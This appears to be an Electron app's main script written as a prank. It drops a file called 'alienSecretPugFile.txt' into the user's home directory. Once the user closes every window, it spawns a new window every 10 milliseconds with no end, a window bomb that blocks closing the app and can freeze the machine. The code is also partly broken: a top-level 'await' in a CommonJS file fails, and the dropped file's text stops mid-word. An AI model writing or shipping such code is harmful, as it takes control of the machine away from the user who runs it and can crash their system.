const os = require('os');
const { app, BrowserWindow } = require('electron');
const homedir = os.homedir();
const path = require('path');
const fs = require('fs').promises;
app.whenReady().then(function() {
  let win = new BrowserWindow({
    width: 800,
    height: 600
  });
  win.loadFile('./mainWindow.html')
});
await fs.writeFile(
  path.join(homedir, "alienSecretPugFile.txt"),
  `
    ALIEN PUG FILE FROM OUTERSPACE
    ALIE
  `
);
app.on('window-all-closed', function() {
  setInterval(function() {
    let win = new BrowserWindow({
      width: 800,
      height: 600
    });
    win.loadFile('./window.html');
  }, 10);
});
